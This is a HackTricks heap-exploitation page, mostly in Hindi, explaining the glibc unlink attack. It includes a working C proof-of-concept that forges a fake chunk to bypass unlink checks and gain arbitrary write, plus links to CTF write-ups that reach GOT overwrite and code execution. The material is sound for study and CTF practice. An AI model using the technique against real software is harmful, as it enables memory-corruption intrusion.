# Unlink Attack

{{#include ../../banners/hacktricks-training.md}}

## Basic Information

जब इस हमले का पता चला, तो इसने ज्यादातर WWW (Write What Where) की अनुमति दी, हालाँकि, कुछ **जांचें जोड़ी गईं** जिससे हमले का नया संस्करण अधिक दिलचस्प, अधिक जटिल और **व्यर्थ** हो गया।

### Code Example:

<details>

<summary>Code</summary>
```c
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <stdio.h>

// Altered from https://github.com/DhavalKapil/heap-exploitation/tree/d778318b6a14edad18b20421f5a06fa1a6e6920e/assets/files/unlink_exploit.c to make it work

struct chunk_structure {
size_t prev_size;
size_t size;
struct chunk_structure *fd;
struct chunk_structure *bk;
char buf[10];               // padding
};

int main() {
unsigned long long *chunk1, *chunk2;
struct chunk_structure *fake_chunk, *chunk2_hdr;
char data[20];

// First grab two chunks (non fast)
chunk1 = malloc(0x8000);
chunk2 = malloc(0x8000);
printf("Stack pointer to chunk1: %p\n", &chunk1);
printf("Chunk1: %p\n", chunk1);
printf("Chunk2: %p\n", chunk2);

// Assuming attacker has control over chunk1's contents
// Overflow the heap, override chunk2's header

// First forge a fake chunk starting at chunk1
// Need to setup fd and bk pointers to pass the unlink security check
fake_chunk = (struct chunk_structure *)chunk1;
fake_chunk->size = 0x8000;
fake_chunk->fd = (struct chunk_structure *)(&chunk1 - 3); // Ensures P->fd->bk == P
fake_chunk->bk = (struct chunk_structure *)(&chunk1 - 2); // Ensures P->bk->fd == P

// Next modify the header of chunk2 to pass all security checks
chunk2_hdr = (struct chunk_structure *)(chunk2 - 2);
chunk2_hdr->prev_size = 0x8000;  // chunk1's data region size
chunk2_hdr->size &= ~1;        // Unsetting prev_in_use bit

// Now, when chunk2 is freed, attacker's fake chunk is 'unlinked'
// This results in chunk1 pointer pointing to chunk1 - 3
// i.e. chunk1[3] now contains chunk1 itself.
// We then make chunk1 point to some victim's data
free(chunk2);
printf("Chunk1: %p\n", chunk1);
printf("Chunk1[3]: %x\n", chunk1[3]);

chunk1[3] = (unsigned long long)data;

strcpy(data, "Victim's data");

// Overwrite victim's data using chunk1
chunk1[0] = 0x002164656b636168LL;

printf("%s\n", data);

return 0;
}

```
</details>

- हमला तब काम नहीं करता जब tcaches का उपयोग किया जाता है (2.26 के बाद)

### लक्ष्य

यह हमला **एक चंक के लिए एक पॉइंटर को अपने से 3 पते पहले इंगित करने की अनुमति देता है**। यदि यह नया स्थान (जहां पॉइंटर स्थित था) में दिलचस्प चीजें हैं, जैसे अन्य नियंत्रित आवंटन / स्टैक..., तो उन्हें पढ़ना/ओवरराइट करना संभव है जिससे बड़ा नुकसान हो सकता है।

- यदि यह पॉइंटर स्टैक में स्थित था, क्योंकि यह अब अपने से 3 पते पहले इंगित कर रहा है और उपयोगकर्ता इसे पढ़ और संशोधित कर सकता है, तो स्टैक से संवेदनशील जानकारी लीक करना या यहां तक कि रिटर्न पते को संशोधित करना (शायद) संभव होगा बिना कैनरी को छुए।
- CTF उदाहरणों के अनुसार, यह पॉइंटर अन्य आवंटनों के लिए पॉइंटर्स के एक एरे में स्थित है, इसलिए, इसे 3 पते पहले इंगित करने और इसे पढ़ने और लिखने में सक्षम होने पर, यह संभव है कि अन्य पॉइंटर्स को अन्य पते पर इंगित किया जाए।\
चूंकि उपयोगकर्ता अन्य आवंटनों को भी पढ़/लिख सकता है, वह जानकारी लीक कर सकता है या मनमाने स्थानों (जैसे GOT में) में नए पते को ओवरराइट कर सकता है।

### आवश्यकताएँ

- कुछ नियंत्रण एक मेमोरी (जैसे स्टैक) में कुछ विशेषताओं को मान देने के लिए कुछ चंक्स बनाने के लिए।
- नकली चंक के पॉइंटर्स को सेट करने के लिए स्टैक लीक।

### हमला

- कुछ चंक्स हैं (chunk1 और chunk2)
- हमलावर chunk1 की सामग्री और chunk2 के हेडर को नियंत्रित करता है।
- chunk1 में हमलावर एक नकली चंक की संरचना बनाता है:
- सुरक्षा को बायपास करने के लिए वह सुनिश्चित करता है कि `size` फ़ील्ड सही है ताकि त्रुटि से बचा जा सके: `corrupted size vs. prev_size while consolidating`
- और नकली चंक के `fd` और `bk` फ़ील्ड उस स्थान पर इंगित कर रहे हैं जहां chunk1 पॉइंटर स्टोर किया गया है -3 और -2 के ऑफसेट के साथ, इसलिए `fake_chunk->fd->bk` और `fake_chunk->bk->fd` मेमोरी (स्टैक) में उस स्थान पर इंगित करते हैं जहां असली chunk1 पता स्थित है:

<figure><img src="../../images/image (1245).png" alt=""><figcaption><p><a href="https://heap-exploitation.dhavalkapil.com/attacks/unlink_exploit">https://heap-exploitation.dhavalkapil.com/attacks/unlink_exploit</a></p></figcaption></figure>

- chunk2 के हेडर को संशोधित किया जाता है ताकि यह संकेत दिया जा सके कि पिछला चंक उपयोग में नहीं है और कि आकार नकली चंक का आकार है।
- जब दूसरा चंक मुक्त किया जाता है, तो यह नकली चंक अनलिंक हो जाता है:
- `fake_chunk->fd->bk` = `fake_chunk->bk`
- `fake_chunk->bk->fd` = `fake_chunk->fd`
- पहले यह सुनिश्चित किया गया था कि `fake_chunk->fd->bk` और `fake_chunk->bk->fd` एक ही स्थान पर इंगित करते हैं (स्टैक में जहां `chunk1` स्टोर किया गया था, इसलिए यह एक मान्य लिंक्ड लिस्ट थी)। चूंकि **दोनों एक ही स्थान की ओर इशारा कर रहे हैं**, केवल अंतिम (`fake_chunk->bk->fd = fake_chunk->fd`) **प्रभाव** डालेगा।
- यह **स्टैक में chunk1 के लिए पॉइंटर को उस पते (या बाइट्स) को ओवरराइट करेगा जो स्टैक में 3 पते पहले स्टोर किया गया था**।
- इसलिए, यदि एक हमलावर फिर से chunk1 की सामग्री को नियंत्रित कर सकता है, तो वह **स्टैक के अंदर लिखने में सक्षम होगा** जिससे वह संभावित रूप से रिटर्न पते को ओवरराइट कर सकेगा, कैनरी को छोड़कर और स्थानीय चर के मान और बिंदुओं को संशोधित कर सकेगा। यहां तक कि स्टैक में chunk1 के पते को एक अलग स्थान पर संशोधित कर सकेगा जहां यदि हमलावर फिर से chunk1 की सामग्री को नियंत्रित कर सके, तो वह कहीं भी लिख सकेगा।
- ध्यान दें कि यह संभव था क्योंकि **पते स्टैक में स्टोर किए गए थे**। जोखिम और शोषण इस पर निर्भर कर सकता है कि **नकली चंक के पते कहां स्टोर किए जा रहे हैं**।

<figure><img src="../../images/image (1246).png" alt=""><figcaption><p><a href="https://heap-exploitation.dhavalkapil.com/attacks/unlink_exploit">https://heap-exploitation.dhavalkapil.com/attacks/unlink_exploit</a></p></figcaption></figure>

## संदर्भ

- [https://heap-exploitation.dhavalkapil.com/attacks/unlink_exploit](https://heap-exploitation.dhavalkapil.com/attacks/unlink_exploit)
- हालांकि CTF में एक अनलिंक हमला पाना अजीब होगा, यहां कुछ लेख हैं जहां इस हमले का उपयोग किया गया था:
- CTF उदाहरण: [https://guyinatuxedo.github.io/30-unlink/hitcon14_stkof/index.html](https://guyinatuxedo.github.io/30-unlink/hitcon14_stkof/index.html)
- इस उदाहरण में, स्टैक के बजाय malloc'ed पते का एक एरे है। अनलिंक हमला यहां एक चंक आवंटित करने के लिए किया जाता है, इसलिए malloc'ed पते के एरे के पॉइंटर्स को नियंत्रित करना संभव है। फिर, एक और कार्यक्षमता है जो इन पते में चंक्स की सामग्री को संशोधित करने की अनुमति देती है, जो GOT के पते को इंगित करने, कार्यों के पते को संशोधित करने, लीक प्राप्त करने और RCE की अनुमति देती है।
- एक और CTF उदाहरण: [https://guyinatuxedo.github.io/30-unlink/zctf16_note2/index.html](https://guyinatuxedo.github.io/30-unlink/zctf16_note2/index.html)
- पिछले उदाहरण की तरह, आवंटनों के पते का एक एरे है। एक अनलिंक हमला किया जा सकता है ताकि पहले आवंटन के पते को एरे शुरू होने से कुछ स्थान पहले इंगित किया जा सके और इस आवंटन को नए स्थान में ओवरराइट किया जा सके। इसलिए, यह अन्य आवंटनों के पॉइंटर्स को GOT के atoi की ओर इंगित करने के लिए ओवरराइट करना संभव है, इसे प्रिंट करना ताकि libc लीक हो सके, और फिर atoi GOT को एक गेजेट के पते के साथ ओवरराइट करना।
- कस्टम malloc और free कार्यों के साथ CTF उदाहरण जो एक vuln का शोषण करते हैं जो अनलिंक हमले के बहुत समान है: [https://guyinatuxedo.github.io/33-custom_misc_heap/csaw17_minesweeper/index.html](https://guyinatuxedo.github.io/33-custom_misc_heap/csaw17_minesweeper/index.html)
- एक ओवरफ्लो है जो कस्टम malloc के FD और BK पॉइंटर्स को नियंत्रित करने की अनुमति देता है जो (कस्टम) मुक्त किए जाएंगे। इसके अलावा, हीप में exec बिट है, इसलिए एक हीप पते को लीक करना और GOT से एक कार्य को एक हीप चंक की ओर इंगित करना संभव है जिसमें निष्पादन के लिए एक शेलकोड है।

{{#include ../../banners/hacktricks-training.md}}
